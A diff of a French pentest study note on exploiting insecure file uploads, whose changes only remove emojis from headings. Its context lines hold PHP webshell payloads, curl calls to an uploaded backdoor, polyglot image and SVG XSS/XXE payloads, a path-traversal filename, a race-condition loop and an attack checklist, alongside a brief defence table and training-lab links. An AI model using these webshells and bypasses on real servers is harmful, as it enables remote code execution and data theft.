@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📤 Upload de Fichiers — exploitation
+# Upload de Fichiers — exploitation
 
 > [!info] **En 1 phrase**
 > Un endpoint d'upload non sécurisé laisse un attaquant déposer un **fichier exécutable** (webshell)
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -33,14 +33,14 @@ flowchart LR
     C --> F[Lu plus tard par l'app<br>= 2nd order : XSS/XXE/CSV inj]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > L'app vérifie souvent **un seul critère** (extension, MIME ou magic bytes) alors que le serveur web
 > en utilise un autre. On joue sur ce **décalage**. L'upload n'est dangereux que si le fichier est
 > ensuite **interprété** (webshell) ou **réutilisé** (2nd order).
 
 ---
 
-## 🗂️ Fichiers dangereux & extensions
+## Fichiers dangereux & extensions
 
 Un webshell = fichier dont l'extension est reconnue par le serveur comme du **code à interpréter**.
 
@@ -63,7 +63,7 @@ shell.soap
 # Python     : .py .pth (persistance via .pth, voir plus bas)
 ```
 
-> [!warning] ⚠️ **Extensions non-code mais exploitables**
+> [!warning] **Extensions non-code mais exploitables**
 > | Extension | Impact |
 > |---|---|
 > | `.svg` | XXE, XSS, SSRF |
@@ -75,7 +75,7 @@ shell.soap
 
 ---
 
-## 📍 Localiser le fichier uploadé
+## Localiser le fichier uploadé
 
 Sans accès direct, un webshell est inutile : il faut trouver le **chemin de stockage** et vérifier
 que le fichier est **servi** par le serveur web.
@@ -92,12 +92,12 @@ ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.t
 curl -s "http://target/uploads/backdoor.php?cmd=id"
 ```
 
-> [!tip] 💡 **Nom de fichier = donnée critique** : s'il est conservé (`shell.php`) tout devient
+> [!tip] **Nom de fichier = donnée critique** : s'il est conservé (`shell.php`) tout devient
 > trivial ; s'il est renommé, on vise `.htaccess`/`.user.ini` (immuables) ou le 2nd order.
 
 ---
 
-## 🕷️ Webshells — payloads
+## Webshells — payloads
 
 ### PHP — toutes les variantes de balises
 
@@ -115,7 +115,7 @@ curl -s "http://target/uploads/backdoor.php?cmd=id"
 <script language="php">system("id");</script>
 ```
 
-> [!warning] ⚠️ **Sans AUCUNE balise PHP** : c'est possible via un fichier de config (`.htaccess`
+> [!warning] **Sans AUCUNE balise PHP** : c'est possible via un fichier de config (`.htaccess`
 > avec `AddHandler`, ou `.user.ini` avec `auto_prepend_file`) — voir section Bypass. Le serveur
 > interprète alors tout le fichier, balise ou non.
 
@@ -161,7 +161,7 @@ print(os.popen("id").read())
 
 ---
 
-## 🚀 Bypass de validation
+## Bypass de validation
 
 ### 1. Extension — double extension & casse
 
@@ -264,9 +264,9 @@ image.png../../../../../../../etc/passwd
 
 ---
 
-## 🧩 Polyglots — image valide contenant du PHP
+## Polyglots — image valide contenant du PHP
 
-> [!tip] 💡 **Principe** : le fichier reste une **vraie image** (passe `getimagesize()`, resize)
+> [!tip] **Principe** : le fichier reste une **vraie image** (passe `getimagesize()`, resize)
 > mais le PHP est caché dans les **métadonnées** (EXIF) ou les **données brutes**. Exploitation via
 > **LFI** (`include`) : le parseur PHP interprète le code jusqu'à la fin du fichier.
 
@@ -292,12 +292,12 @@ php createPNGwithPLTE.php   # → shell.png, code injecté dans la PLTE (non com
 python3 createBulletproofJPG.py -o shell.jpg -p "<?php system(\$_GET['cmd']); ?>"
 ```
 
-> [!warning] ⚠️ **Resize** : si l'app redimensionne, le code en métadonnées est **perdu** → le mettre
+> [!warning] **Resize** : si l'app redimensionne, le code en métadonnées est **perdu** → le mettre
 > dans les **données pixel compressées** (méthodes 3/4), qui survivent à `imagecreatefrom*()`.
 
 ---
 
-## 🖼️ SVG → XSS (et XML)
+## SVG → XSS (et XML)
 
 Le SVG = du XML servi comme image : un script JS s'exécute à l'ouverture, et le XML permet l'**XXE**
 si l'app parse le fichier serveur-side.
@@ -320,12 +320,12 @@ si l'app parse le fichier serveur-side.
 <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
 ```
 
-> [!tip] 💡 Un `.gif`/`.html` avec `<script>` sert directement déclenche aussi un **XSS** si l'app
+> [!tip] Un `.gif`/`.html` avec `<script>` sert directement déclenche aussi un **XSS** si l'app
 > n'envoie pas `Content-Disposition: attachment` ni CSP.
 
 ---
 
-## 🏁 Race conditions (upload TOCTOU)
+## Race conditions (upload TOCTOU)
 
 > Non couvert par PayloadsAllTheThings, mais classique en réel : l'app **déplace/vérifie** le
 > fichier après l'avoir stocké, ou le nettoyage (AV, ré-encodage) tourne **en asynchrone**.
@@ -337,12 +337,12 @@ for i in $(seq 1 500); do curl -s "http://target/uploads/shell.php?cmd=id" & don
 wait
 ```
 
-> [!warning] ⚠️ Exige un **accès direct** au fichier pendant la fenêtre de vulnérabilité. Échec si
+> [!warning] Exige un **accès direct** au fichier pendant la fenêtre de vulnérabilité. Échec si
 > la vérification est **synchrone** (avant écriture).
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 ```bash
 # Burp — extension "Upload Scanner" (BApp Store) : scanne les formulaires multipart, teste les bypass.
@@ -369,7 +369,7 @@ exiftool -all= img.jpg     # nettoie les tags (OPSEC)
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -385,12 +385,12 @@ exiftool -all= img.jpg     # nettoie les tags (OPSEC)
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Repérer un formulaire multipart (avatar, pièce jointe, import...) → 2. Upload propre (chemin ? accès direct ?) → 3. Extensions → 4. MIME → 5. Magic bytes → 6. Polyglot → 7. `.htaccess`/`.user.ini` → 8. RCE confirmé = gestion via weevely ou LFI.
 
-> [!warning] ⚠️ **Pièges fréquents**
+> [!warning] **Pièges fréquents**
 > - La **vérification du MIME ne suffit JAMAIS** : elle se falsifie en 1 clic (Burp).
 > - **`.htaccess` en premier sur Apache** : si l'upload le permet, tous les autres bypass sont inutiles.
 >   Vérifier aussi s'il existe déjà (écrasé via path traversal ?).
@@ -405,7 +405,7 @@ exiftool -all= img.jpg     # nettoie les tags (OPSEC)
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger — File upload vulnerabilities : https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities
 - Root-Me — Double extensions : https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions
@@ -416,10 +416,10 @@ exiftool -all= img.jpg     # nettoie les tags (OPSEC)
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[LFI et RFI|📂 LFI / RFI]]
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)
+- [[Injection de commandes| Injection de commandes]]
+- [[LFI et RFI| LFI / RFI]]
+- [[XSS (Cross-Site Scripting)| XSS]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)
